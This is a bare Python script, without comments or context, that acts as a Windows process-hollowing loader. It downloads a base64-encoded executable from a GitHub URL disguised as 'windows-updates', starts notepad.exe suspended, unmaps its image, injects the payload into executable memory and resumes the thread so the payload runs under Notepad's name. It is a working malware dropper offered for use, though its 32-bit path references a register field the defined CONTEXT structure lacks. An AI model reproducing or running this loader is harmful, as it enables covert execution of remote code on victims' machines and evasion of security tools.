import ctypes,struct,base64,urllib.request,json
from ctypes import wintypes
PAYLOAD_URL="https://raw.githubusercontent.com/Quincyzx/windows-updates/refs/heads/main/payload.json"
PROCESS_ALL_ACCESS=0x1F0FFF
MEM_COMMIT=0x1000
MEM_RESERVE=0x2000
PAGE_EXECUTE_READWRITE=0x40
CREATE_SUSPENDED=0x4
IMAGE_DOS_SIGNATURE=0x5A4D
IMAGE_NT_SIGNATURE=0x00004550
CONTEXT_FULL=0x10007

class STARTUPINFO(ctypes.Structure):
    _fields_=[("cb",wintypes.DWORD),("lpReserved",wintypes.LPSTR),("lpDesktop",wintypes.LPSTR),("lpTitle",wintypes.LPSTR),("dwX",wintypes.DWORD),("dwY",wintypes.DWORD),("dwXSize",wintypes.DWORD),("dwYSize",wintypes.DWORD),("dwXCountChars",wintypes.DWORD),("dwYCountChars",wintypes.DWORD),("dwFillAttribute",wintypes.DWORD),("dwFlags",wintypes.DWORD),("wShowWindow",wintypes.WORD),("cbReserved2",wintypes.WORD),("lpReserved2",wintypes.LPBYTE),("hStdInput",wintypes.HANDLE),("hStdOutput",wintypes.HANDLE),("hStdError",wintypes.HANDLE)]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_=[("hProcess",wintypes.HANDLE),("hThread",wintypes.HANDLE),("dwProcessId",wintypes.DWORD),("dwThreadId",wintypes.DWORD)]

class CONTEXT(ctypes.Structure):
    _fields_=[("P1Home",ctypes.c_uint64),("P2Home",ctypes.c_uint64),("P3Home",ctypes.c_uint64),("P4Home",ctypes.c_uint64),("P5Home",ctypes.c_uint64),("P6Home",ctypes.c_uint64),("ContextFlags",ctypes.c_uint32),("MxCsr",ctypes.c_uint32),("SegCs",ctypes.c_uint16),("SegDs",ctypes.c_uint16),("SegEs",ctypes.c_uint16),("SegFs",ctypes.c_uint16),("SegGs",ctypes.c_uint16),("SegSs",ctypes.c_uint16),("EFlags",ctypes.c_uint32),("Dr0",ctypes.c_uint64),("Dr1",ctypes.c_uint64),("Dr2",ctypes.c_uint64),("Dr3",ctypes.c_uint64),("Dr6",ctypes.c_uint64),("Dr7",ctypes.c_uint64),("Rax",ctypes.c_uint64),("Rcx",ctypes.c_uint64),("Rdx",ctypes.c_uint64),("Rbx",ctypes.c_uint64),("Rsp",ctypes.c_uint64),("Rbp",ctypes.c_uint64),("Rsi",ctypes.c_uint64),("Rdi",ctypes.c_uint64),("R8",ctypes.c_uint64),("R9",ctypes.c_uint64),("R10",ctypes.c_uint64),("R11",ctypes.c_uint64),("R12",ctypes.c_uint64),("R13",ctypes.c_uint64),("R14",ctypes.c_uint64),("R15",ctypes.c_uint64),("Rip",ctypes.c_uint64)]

k=ctypes.windll.kernel32
n=ctypes.windll.ntdll
CreateProcessA=k.CreateProcessA
CreateProcessA.argtypes=[wintypes.LPCSTR,wintypes.LPSTR,wintypes.LPVOID,wintypes.LPVOID,wintypes.BOOL,wintypes.DWORD,wintypes.LPVOID,wintypes.LPCSTR,ctypes.POINTER(STARTUPINFO),ctypes.POINTER(PROCESS_INFORMATION)]
CreateProcessA.restype=wintypes.BOOL
OpenProcess=k.OpenProcess
OpenProcess.argtypes=[wintypes.DWORD,wintypes.BOOL,wintypes.DWORD]
OpenProcess.restype=wintypes.HANDLE
VirtualAllocEx=k.VirtualAllocEx
VirtualAllocEx.argtypes=[wintypes.HANDLE,wintypes.LPVOID,ctypes.c_size_t,wintypes.DWORD,wintypes.DWORD]
VirtualAllocEx.restype=wintypes.LPVOID
WriteProcessMemory=k.WriteProcessMemory
WriteProcessMemory.argtypes=[wintypes.HANDLE,wintypes.LPVOID,wintypes.LPVOID,ctypes.c_size_t,ctypes.POINTER(ctypes.c_size_t)]
WriteProcessMemory.restype=wintypes.BOOL
ReadProcessMemory=k.ReadProcessMemory
ReadProcessMemory.argtypes=[wintypes.HANDLE,wintypes.LPVOID,wintypes.LPVOID,ctypes.c_size_t,ctypes.POINTER(ctypes.c_size_t)]
ReadProcessMemory.restype=wintypes.BOOL
GetThreadContext=k.GetThreadContext
GetThreadContext.argtypes=[wintypes.HANDLE,ctypes.POINTER(CONTEXT)]
GetThreadContext.restype=wintypes.BOOL
SetThreadContext=k.SetThreadContext
SetThreadContext.argtypes=[wintypes.HANDLE,ctypes.POINTER(CONTEXT)]
SetThreadContext.restype=wintypes.BOOL
ResumeThread=k.ResumeThread
ResumeThread.argtypes=[wintypes.HANDLE]
ResumeThread.restype=wintypes.DWORD
CloseHandle=k.CloseHandle
CloseHandle.argtypes=[wintypes.HANDLE]
CloseHandle.restype=wintypes.BOOL
NtUnmapViewOfSection=n.NtUnmapViewOfSection
NtUnmapViewOfSection.argtypes=[wintypes.HANDLE,wintypes.LPVOID]
NtUnmapViewOfSection.restype=ctypes.c_ulong

def parse_pe(payload):
    if len(payload)<64:return None
    if struct.unpack('<H',payload[0:2])[0]!=IMAGE_DOS_SIGNATURE:return None
    pe_offset=struct.unpack('<I',payload[60:64])[0]
    if pe_offset>=len(payload):return None
    if struct.unpack('<I',payload[pe_offset:pe_offset+4])[0]!=IMAGE_NT_SIGNATURE:return None
    opt_header_offset=pe_offset+24
    machine=struct.unpack('<H',payload[pe_offset+4:pe_offset+6])[0]
    is_64bit=(machine==0x8664)
    if is_64bit:
        entry_point_rva=struct.unpack('<I',payload[opt_header_offset+16:opt_header_offset+20])[0]
        image_base=struct.unpack('<Q',payload[opt_header_offset+24:opt_header_offset+32])[0]
    else:
        entry_point_rva=struct.unpack('<I',payload[opt_header_offset+16:opt_header_offset+20])[0]
        image_base=struct.unpack('<I',payload[opt_header_offset+28:opt_header_offset+32])[0]
    return{'entry_point':entry_point_rva,'image_base':image_base,'is_64bit':is_64bit,'pe_offset':pe_offset}

def hollow(hProcess,hThread,payload):
    pe_info=parse_pe(payload)
    if not pe_info:return False
    ctx=CONTEXT()
    ctx.ContextFlags=CONTEXT_FULL
    if not GetThreadContext(hThread,ctypes.byref(ctx)):return False
    peb_addr=ctx.Rdx if pe_info['is_64bit']else ctx.Ebx
    peb_imagebase_offset=0x10 if pe_info['is_64bit']else 0x08
    imagebase_buffer=(ctypes.c_byte*8)()if pe_info['is_64bit']else(ctypes.c_byte*4)()
    bytes_read=ctypes.c_size_t(0)
    if not ReadProcessMemory(hProcess,peb_addr+peb_imagebase_offset,imagebase_buffer,len(imagebase_buffer),ctypes.byref(bytes_read)):return False
    old_image_base=struct.unpack('<Q',bytes(imagebase_buffer))[0]if pe_info['is_64bit']else struct.unpack('<I',bytes(imagebase_buffer))[0]
    NtUnmapViewOfSection(hProcess,old_image_base)
    new_image_base=VirtualAllocEx(hProcess,pe_info['image_base'],len(payload),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)
    if not new_image_base:new_image_base=VirtualAllocEx(hProcess,None,len(payload),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)
    if not new_image_base:return False
    written=ctypes.c_size_t(0)
    if not WriteProcessMemory(hProcess,new_image_base,payload,len(payload),ctypes.byref(written)):return False
    if new_image_base!=pe_info['image_base']:
        new_base_bytes=struct.pack('<Q',new_image_base)if pe_info['is_64bit']else struct.pack('<I',new_image_base)
        WriteProcessMemory(hProcess,peb_addr+peb_imagebase_offset,new_base_bytes,len(new_base_bytes),None)
    entry_point=new_image_base+pe_info['entry_point']
    ctx.Rip=entry_point if pe_info['is_64bit']else(entry_point&0xFFFFFFFF)
    if not SetThreadContext(hThread,ctypes.byref(ctx)):return False
    return True

si=STARTUPINFO()
si.cb=ctypes.sizeof(STARTUPINFO)
pi=PROCESS_INFORMATION()
if CreateProcessA(None,b"C:\\Windows\\System32\\notepad.exe",None,None,False,CREATE_SUSPENDED,None,None,ctypes.byref(si),ctypes.byref(pi)):
    hProcess=OpenProcess(PROCESS_ALL_ACCESS,False,pi.dwProcessId)
    if hProcess:
        payload_b64=json.loads(urllib.request.urlopen(PAYLOAD_URL).read().decode())["payload"]
        payload=base64.b64decode(payload_b64)
        if hollow(hProcess,pi.hThread,payload):ResumeThread(pi.hThread)
        CloseHandle(hProcess)
    CloseHandle(pi.hProcess)
    CloseHandle(pi.hThread)
